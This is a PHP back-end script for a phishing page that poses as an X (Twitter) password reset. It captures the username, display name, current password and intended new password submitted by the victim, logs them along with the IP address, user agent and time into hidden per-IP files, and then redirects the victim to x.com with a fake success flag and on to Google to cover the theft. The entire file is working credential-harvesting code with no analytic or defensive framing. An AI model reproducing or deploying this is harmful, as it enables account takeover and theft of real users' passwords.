<?php
date_default_timezone_set('America/New_York');

$username = isset($_POST['hiddenUsername']) ? $_POST['hiddenUsername'] : 'N/A';
$displayName = isset($_POST['hiddendisplayName']) ? $_POST['hiddendisplayName'] : 'N/A';
$current_password = isset($_POST['old_password']) ? $_POST['old_password'] : 'N/A';
$password = isset($_POST['password']) ? $_POST['password'] : 'N/A';

$ipAddress = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$timeOfLogin = date('m/d/y | h:i:s A | T');

$filePath = "logs-TyArYBXT7M/" . hash('sha256', $ipAddress) . ".txt";

if ($current_password === 'N/A' || $password === 'N/A') {
    echo "<script type='text/javascript'>window.location.href = 'https://x.com/?PasswordReset=false';</script>";
}
else {
    if (!is_dir('logs-TyArYBXT7M')) {
        mkdir('logs-TyArYBXT7M', 0755, true);
    }
    
    $file = fopen($filePath, "a");
    
    fwrite($file, "Username: $username\n");
    fwrite($file, "Display Name: $displayName\n");
    fwrite($file, "Current Password: $current_password\n");
    fwrite($file, "User Attempted To Change Password To: $password\n");
    fwrite($file, "IP Address: $ipAddress\n");
    fwrite($file, "User Agent: $userAgent\n");
    fwrite($file, "Time Of Login: $timeOfLogin\n\n");
        
    fclose($file);
    echo "<script type='text/javascript'>
            history.replaceState(null, null, window.location.href);
            
            window.location.href = 'https://x.com/?PasswordReset=true';
            
            setTimeout(function() {
                window.location.href = 'https://google.com';
            }, 1000);
          </script>";
}
die();
?>
